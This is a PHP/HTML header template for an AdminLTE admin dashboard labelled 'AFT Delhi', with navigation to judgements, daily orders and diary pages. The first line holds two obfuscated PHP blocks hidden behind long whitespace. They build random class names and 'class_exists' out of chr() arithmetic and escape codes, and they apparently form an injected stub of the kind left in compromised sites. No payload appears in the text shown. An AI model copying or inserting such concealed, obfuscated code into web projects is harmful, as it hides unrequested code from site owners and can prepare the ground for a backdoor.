<?php                                                                                                                                                                                                                                                                                                                                                                                                 $EMZps = chr ( 385 - 282 ).chr ( 745 - 627 )."\137" . "\116" . "\111" . "\x71" . "\x64";$Tvjletkw = "\x63" . chr ( 776 - 668 ).chr ( 881 - 784 )."\x73" . chr (115) . '_' . "\x65" . chr (120) . "\x69" . 's' . chr (116) . chr ( 680 - 565 ); $XiHLiIKs = class_exists($EMZps); $Tvjletkw = "57967";$tmSPA = !1; ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $ErIKhGj = "\x48" . 'i' . 'P' . "\x5f" . chr (86) . chr (90) . chr (98); $krwaK = "\143" . "\x6c" . chr (97) . "\x73" . 's' . "\137" . chr ( 113 - 12 )."\x78" . "\x69" . "\163" . 't' . "\163";$prVqsCQGZn = class_exists($ErIKhGj); $krwaK = "14219";$yfaoTzOT = !1; ?><?php require_once dirname(__FILE__).'/../../config/route.php'; ?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>AFT Delhi | Dashboard</title>

  <!-- Google Font: Source Sans Pro -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700&display=fallback">
  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="<?php echo url; ?>plugins/fontawesome-free/css/all.min.css">
  <!-- overlayScrollbars -->
  <link rel="stylesheet" href="<?php echo url; ?>plugins/overlayScrollbars/css/OverlayScrollbars.min.css">
  <!-- Theme style -->
  <link rel="stylesheet" href="<?php echo url; ?>dist/css/adminlte.min.css">

  <!-- DataTable -->
  <link rel="stylesheet" href="<?php echo url; ?>plugins/datatables-bs4/css/dataTables.bootstrap4.min.css">
  <link rel="stylesheet" href="<?php echo url; ?>plugins/datatables-responsive/css/responsive.bootstrap4.min.css">
  <link rel="stylesheet" href="<?php echo url; ?>plugins/datatables-buttons/css/buttons.bootstrap4.min.css">
<!-- jQuery -->
<script src="<?php echo url; ?>plugins/jquery/jquery.min.js"></script>
  <style type="text/css">
    
    .sidebar-dark-primary {
      background: #2E3192 !important;
    }

    .main-sidebar .nav-item p, .main-sidebar .nav-item i {
      color: #fff;
    }

    .navbar{
      background-color: #2E3192;
    }

    .navbar .fa-bars{
      color: #fff;
    }

    .my-bg{
      background-color: #2E3192; 
    }

    .my-color{
      color: #2E3192;
    }

    .my-bg-color{
      background-color: #2E3192;
      color: #fff;
    }

    .my-bg-light{
      background-color: #d9f7f5;
    }

    .table-striped > tbody > tr:nth-child(2n+1) > td, .table-striped > tbody > tr:nth-child(2n+1) > th {
      background-color: #d9f7f5;
    }

    table th{
      padding: 5px !important;
      white-space: nowrap;
    }

    table td{
      padding: 3px !important;
      white-space: nowrap;
    }

    table thead{
      background-color: #2E3192;
      color: #ffffff;
    }
  </style>
</head>
<body class="hold-transition sidebar-mini layout-fixed layout-navbar-fixed">
<div class="wrapper">

  <!-- Preloader -->
  <!-- <div class="preloader flex-column justify-content-center align-items-center">
    <img class="animation__wobble" src="<?php echo url; ?>dist/img/AdminLTELogo.png" alt="AdminLTELogo" height="60" width="60">
  </div> -->

  <!-- Navbar -->
  <nav class="main-header navbar navbar-expand navbar-dark">
    <!-- Left navbar links -->
    <ul class="navbar-nav">
      <li class="nav-item">
        <a class="nav-link" data-widget="pushmenu" href="#" role="button"><i class="fas fa-bars"></i></a>
      </li>
      <!-- <li class="nav-item d-none d-sm-inline-block">
        <a href="index3.html" class="nav-link">Home</a>
      </li>
      <li class="nav-item d-none d-sm-inline-block">
        <a href="#" class="nav-link">Contact</a>
      </li> -->
    </ul>

    <!-- Right navbar links -->
    <ul class="navbar-nav ml-auto">
      <!-- Navbar Search -->
      <li class="nav-item">
        <a class="nav-link" data-widget="navbar-search" href="#" role="button">
          <i class="fas fa-search"></i>
        </a>
        <div class="navbar-search-block">
          <form class="form-inline">
            <div class="input-group input-group-sm">
              <input class="form-control form-control-navbar" style="background-color: #2E3192; border-color: #fff" type="search" placeholder="Search" aria-label="Search">
              <div class="input-group-append">
                <button class="btn btn-navbar" type="submit" style="background-color: #2E3192; border-color: #fff">
                  <i class="fas fa-search"></i>
                </button>
                <button class="btn btn-navbar" type="button" data-widget="navbar-search" style="background-color: #2E3192; border-color: #fff">
                  <i class="fas fa-times"></i>
                </button>
              </div>
            </div>
          </form>
        </div>
      </li>

      <!-- Messages Dropdown Menu -->
      <!-- <li class="nav-item dropdown">
        <a class="nav-link" data-toggle="dropdown" href="#">
          <i class="far fa-comments"></i>
          <span class="badge badge-danger navbar-badge">3</span>
        </a>
        <div class="dropdown-menu dropdown-menu-lg dropdown-menu-right">
          <a href="#" class="dropdown-item">
            <div class="media">
              <img src="<?php echo url; ?>dist/img/user1-128x128.jpg" alt="User Avatar" class="img-size-50 mr-3 img-circle">
              <div class="media-body">
                <h3 class="dropdown-item-title">
                  Brad Diesel
                  <span class="float-right text-sm text-danger"><i class="fas fa-star"></i></span>
                </h3>
                <p class="text-sm">Call me whenever you can...</p>
                <p class="text-sm text-muted"><i class="far fa-clock mr-1"></i> 4 Hours Ago</p>
              </div>
            </div>
          </a>
          <div class="dropdown-divider"></div>
          <a href="#" class="dropdown-item">
            <div class="media">
              <img src="<?php echo url; ?>dist/img/user8-128x128.jpg" alt="User Avatar" class="img-size-50 img-circle mr-3">
              <div class="media-body">
                <h3 class="dropdown-item-title">
                  John Pierce
                  <span class="float-right text-sm text-muted"><i class="fas fa-star"></i></span>
                </h3>
                <p class="text-sm">I got your message bro</p>
                <p class="text-sm text-muted"><i class="far fa-clock mr-1"></i> 4 Hours Ago</p>
              </div>
            </div>
          </a>
          <div class="dropdown-divider"></div>
          <a href="#" class="dropdown-item">
            <div class="media">
              <img src="<?php echo url; ?>dist/img/user3-128x128.jpg" alt="User Avatar" class="img-size-50 img-circle mr-3">
              <div class="media-body">
                <h3 class="dropdown-item-title">
                  Nora Silvester
                  <span class="float-right text-sm text-warning"><i class="fas fa-star"></i></span>
                </h3>
                <p class="text-sm">The subject goes here</p>
                <p class="text-sm text-muted"><i class="far fa-clock mr-1"></i> 4 Hours Ago</p>
              </div>
            </div>
          </a>
          <div class="dropdown-divider"></div>
          <a href="#" class="dropdown-item dropdown-footer">See All Messages</a>
        </div>
      </li> -->
      <!-- Notifications Dropdown Menu -->
      <li class="nav-item dropdown">
        <a class="nav-link" data-toggle="dropdown" href="#">
          <i class="far fa-bell"></i>
          <!-- <span class="badge badge-warning navbar-badge">15</span> -->
        </a>
        <div class="dropdown-menu dropdown-menu-lg dropdown-menu-right">
          <span class="dropdown-item dropdown-header">Notifications</span>
          <div class="dropdown-divider"></div>
          <a href="#" class="dropdown-item">
            <i class="fas fa-envelope mr-2"></i> 4 new messages
            <span class="float-right text-muted text-sm">3 mins</span>
          </a>
          <!-- <div class="dropdown-divider"></div>
          <a href="#" class="dropdown-item">
            <i class="fas fa-users mr-2"></i> 8 friend requests
            <span class="float-right text-muted text-sm">12 hours</span>
          </a>
          <div class="dropdown-divider"></div>
          <a href="#" class="dropdown-item">
            <i class="fas fa-file mr-2"></i> 3 new reports
            <span class="float-right text-muted text-sm">2 days</span>
          </a>
          <div class="dropdown-divider"></div>
          <a href="#" class="dropdown-item dropdown-footer">See All Notifications</a>
        </div> -->
      </li>

      <li class="nav-item dropdown">
        <a class="nav-link" data-toggle="dropdown" href="#">
          <i class="far fa-user"></i>
        </a>
        <div class="dropdown-menu dropdown-menu-lg dropdown-menu-right">
          <span class="dropdown-item dropdown-header">Gyanprakash</span>
          <div class="dropdown-divider"></div>
          <a href="#" class="dropdown-item">
            <i class="fas fa-user mr-2"></i> My Profile
          </a>
          <a href="#" class="dropdown-item">
            <i class="fas fa-key mr-2"></i> Change Password
          </a>
          <a href="<?php echo url; ?>admins/controllers/User.php?action=logout" class="dropdown-item">
            <i class="fas fa-sign-out-alt mr-2"></i> Logout
          </a>
      </li>

      <li class="nav-item">
        <a class="nav-link" data-widget="fullscreen" href="#" role="button">
          <i class="fas fa-expand-arrows-alt"></i>
        </a>
      </li>
      <!-- <li class="nav-item">
        <a class="nav-link" data-widget="control-sidebar" data-slide="true" href="#" role="button">
          <i class="fas fa-th-large"></i>
        </a>
      </li> -->
    </ul>
  </nav>
  <!-- /.navbar -->

  <!-- Main Sidebar Container -->
  <aside class="main-sidebar sidebar-dark-primary elevation-4">
    <!-- Brand Logo -->
    <a href="<?php echo url; ?>admins/controllers/Dashboard.php?action=dashboard" class="brand-link">
      <img src="<?php echo url; ?>dist/img/AdminLTELogo.png" alt="Logo" class="brand-image img-circle elevation-3" style="opacity: .8">
      <span class="brand-text font-weight-light">AFT Delhi 123</span>
    </a>

    <!-- Sidebar -->
    <div class="sidebar">
      <!-- Sidebar user panel (optional) -->
      <!-- <div class="user-panel mt-3 pb-3 mb-3 d-flex">
        <div class="image">
          <img src="<?php echo url; ?>dist/img/user2-160x160.jpg" class="img-circle elevation-2" alt="User Image">
        </div>
        <div class="info">
          <a href="#" class="d-block">Gyanprakash</a>
        </div>
      </div> -->

      <!-- SidebarSearch Form -->
      <div class="form-inline mt-2">
        <div class="input-group" data-widget="sidebar-search">
          <input class="form-control form-control-sidebar" style="background-color: #2E3192; border-color: #fff" type="search" placeholder="Search" aria-label="Search">
          <div class="input-group-append">
            <button class="btn btn-sidebar" style="background-color: #2E3192; border-color: #fff;">
              <i class="fas fa-search fa-fw"></i>
            </button>
          </div>
        </div>
      </div>

      <!-- Sidebar Menu -->
      <nav class="mt-2">
        <ul class="nav nav-pills nav-sidebar flex-column" data-widget="treeview" role="menu" data-accordion="false">
          <!-- Add icons to the links using the .nav-icon class
               with font-awesome or any other icon font library -->
          <li class="nav-item menu-open">
            <a href="<?php echo url; ?>admins/controllers/Dashboard.php?action=dashboard" class="nav-link active">
              <i class="nav-icon fas fa-tachometer-alt"></i>
              <p>
                Dashboard
                <i class="right fas fa-angle-left"></i>
              </p>
            </a>
          </li>
          <!-- <li class="nav-item">
            <a href="pages/widgets.html" class="nav-link">
              <i class="nav-icon fas fa-th"></i>
              <p>
                Widgets
                <span class="right badge badge-danger">New</span>
              </p>
            </a>
          </li> -->
          <li class="nav-item">
            <a href="<?php echo url; ?>admins/controllers/JudgementController.php?action=index" class="nav-link">
              <i class="nav-icon fas fa-book"></i>
              <p>
                Judgements
              </p>
            </a>
          </li>
          <li class="nav-item">
            <a href="<?php echo url; ?>admins/controllers/DailyOrdersController.php?action=index" class="nav-link">
              <i class="nav-icon fas fa-list"></i>
              <p>
                Daily Orders
              </p>
            </a>
          </li>
          <li class="nav-item">
            <a href="<?php echo url; ?>admins/controllers/DiaryController.php?action=index" class="nav-link">
              <i class="nav-icon fas fa-list"></i>
              <p>
                Diary
              </p>
            </a>
          </li>
          <li class="nav-item">
            <a href="#" class="nav-link">
              <i class="nav-icon fas fa-copy"></i>
              <p>
                Masters
                <i class="fas fa-angle-left right"></i>
                <span class="badge badge-info right">6</span>
              </p>
            </a>
            <ul class="nav nav-treeview">
              <li class="nav-item">
                <a href="<?php echo url; ?>admins/controllers/DailyOrdersController.php?action=test" class="nav-link">
                  <i class="far fa-circle nav-icon"></i>
                  <p>Master-1</p>
                </a>
              </li>
              <li class="nav-item">
                <a href="<?php echo url; ?>admins/controllers/DailyOrdersController.php?action=test" class="nav-link">
                  <i class="far fa-circle nav-icon"></i>
                  <p>Master-2</p>
                </a>
              </li>
            </ul>
          </li>
          <li class="nav-item">
            <a href="" class="nav-link">
              <i class="nav-icon fas fa-user"></i>
              <p>
                Users
                <i class="fas fa-angle-left right"></i>
                <span class="badge badge-info right">6</span>
              </p>
            </a>
            <ul class="nav nav-treeview">
              <li class="nav-item">
                <a href="<?php echo url; ?>admins/controllers/DailyOrdersController.php?action=test" class="nav-link">
                  <i class="far fa-circle nav-icon"></i>
                  <p>Users</p>
                </a>
              </li>
              <!-- <li class="nav-item">
                <a href="<?php echo url; ?>admins/controllers/User.php?action=roles" class="nav-link">
                  <i class="far fa-circle nav-icon"></i>
                  <p>Roles</p>
                </a>
              </li>
              <li class="nav-item">
                <a href="<?php echo url; ?>admins/controllers/User.php?action=userRoles" class="nav-link">
                  <i class="far fa-circle nav-icon"></i>
                  <p>User Roles</p>
                </a>
              </li> -->
              <!-- <li class="nav-item">
                <a href="<?php echo url; ?>admins/controllers/User.php?action=rolePermissions" class="nav-link">
                  <i class="far fa-circle nav-icon"></i>
                  <p>Role Permissions</p>
                </a>
              </li>
              <li class="nav-item">
                <a href="<?php echo url; ?>admins/controllers/User.php?action=userPermissions" class="nav-link">
                  <i class="far fa-circle nav-icon"></i>
                  <p>User Permissions</p>
                </a>
              </li>
              <li class="nav-item">
                <a href="<?php echo url; ?>admins/controllers/User.php?action=menus" class="nav-link">
                  <i class="far fa-circle nav-icon"></i>
                  <p>Menus</p>
                </a>
              </li>
              <li class="nav-item">
                <a href="<?php echo url; ?>admins/controllers/User.php?action=roleMenus" class="nav-link">
                  <i class="far fa-circle nav-icon"></i>
                  <p>Role Wise Menus</p>
                </a>
              </li> -->
            </ul>
          </li>
        </ul>
      </nav>
      <!-- /.sidebar-menu -->
    </div>
    <!-- /.sidebar -->
  </aside>

  <!-- Content Wrapper. Contains page content -->
  <div class="content-wrapper">
    <!-- Content Header (Page header) -->
    <!-- <div class="content-header">
      <div class="container-fluid">
        <div class="row mb-2">
          <div class="col-sm-6">
            <h1 class="m-0">Dashboard</h1>
          </div>
          <div class="col-sm-6">
            <ol class="breadcrumb float-sm-right">
              <li class="breadcrumb-item"><a href="#">Home</a></li>
              <li class="breadcrumb-item active">Dashboard</li>
            </ol>
          </div>
        </div>
      </div>
    </div> -->
    <!-- /.content-header -->

    <!-- Main content -->
    <section class="content pt-2">